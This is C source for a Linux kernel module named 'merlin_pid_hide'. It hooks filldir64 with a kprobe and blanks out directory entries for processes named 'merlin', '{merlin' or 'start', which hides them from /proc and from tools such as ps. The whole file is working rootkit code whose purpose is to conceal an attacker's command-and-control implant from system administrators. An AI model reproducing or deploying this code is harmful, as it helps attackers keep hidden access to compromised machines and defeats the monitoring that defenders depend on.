#include <linux/kernel.h>
#include <linux/module.h>
#include <linux/kprobes.h>
#include <linux/sched.h>
#include <linux/pid.h>

#ifndef pr_fmt
#define pr_fmt(fmt) "%s: " fmt, __func__
#endif

#ifndef dbg_print
#ifdef DEBUG
#define dbg_print(fmt, ...) pr_info(fmt, ##__VA_ARGS__)
#else
#define dbg_print(fmt, ...) /* No-op */
#endif
#endif

#define HIDE_CMD1 "merlin"
#define HIDE_CMD2 "{merlin"
#define HIDE_CMD3 "start"
#define MAX_PIDS 10

int *pid_to_hides = NULL;
int pid_count = 0;
bool check_pid(pid_t pid);
void add_pid(pid_t pid);
void scan_pid(void);
int pid_handler_pre(struct kprobe *p, struct pt_regs *regs);
int pid_hide_init(void);
void pid_hide_exit(void);


static struct kprobe kp_pid = {
	.symbol_name = "filldir64",
};

// Check PID
bool check_pid(pid_t pid)
{
	for (int i = 0; i < pid_count; i++) {
		if (pid_to_hides[i] == pid)
			return true;
	}
	return false;
}

// add PID
void add_pid(pid_t pid)
{
	if (pid_count >= MAX_PIDS) {
		dbg_print("PID array is full\n");
		return;
	}
	pid_to_hides[pid_count++] = pid;
	dbg_print("Hiding PID %d: \n", pid);
}

void scan_pid(void)
{
	struct task_struct *task;

	// Scan all running processes
	for_each_process(task) {
		if (!strncmp(task->comm, HIDE_CMD1, strlen(HIDE_CMD1)) ||
		    !strncmp(task->comm, HIDE_CMD2, strlen(HIDE_CMD2)) ||
			!strncmp(task->comm, HIDE_CMD3, strlen(HIDE_CMD3))) {
			dbg_print("Process found (PID: %d, Name: %s)\n",
				  task->pid, task->comm);

			// Check PID
			if (check_pid(task->pid))
				dbg_print("PID %d already hidden\n", task->pid);
			else
				add_pid(task->pid);
		}
	}
}

int __kprobes pid_handler_pre(struct kprobe *p, struct pt_regs *regs)
{
	char *filename = (char *)regs->si;
	scan_pid();

	// Hide PID
	for (int i = 0; i < pid_count; i++) {
		char pid_name[16];
		snprintf(pid_name, sizeof(pid_name), "%d", pid_to_hides[i]);

		if (strcmp(filename, pid_name) == 0) {
			dbg_print("Hiding PID: %d\n", pid_to_hides[i]);

			memset(filename, 0, strlen(filename));
			return 0;
		}
	}

	return 0;
}

int  __init pid_hide_init(void)
{
	int ret;
	kp_pid.pre_handler = pid_handler_pre;

	pid_to_hides = kmalloc_array(MAX_PIDS, sizeof(int), GFP_KERNEL);
	if (!pid_to_hides) {
		dbg_print("Failed to allocate PID array memory\n");
		return -ENOMEM;
	}

	ret = register_kprobe(&kp_pid);
	if (ret < 0) {
		dbg_print("register_kprobe failed, returned %d\n", ret);
		kfree(pid_to_hides);
		return ret;
	}
	dbg_print("filldir64: %px\n", kp_pid.addr);
	return 0;
}

void  __exit pid_hide_exit(void)
{
	unregister_kprobe(&kp_pid);
	kfree(pid_to_hides);
	dbg_print("pid_hide exit successfully\n");
}

// Uncomment if you want to use this module as a standalone module
// module_init(pid_hide_init) 
// module_exit(pid_hide_exit)

MODULE_AUTHOR("Phoenix2006");
MODULE_DESCRIPTION("merlin_pid_hide");
MODULE_LICENSE("GPL");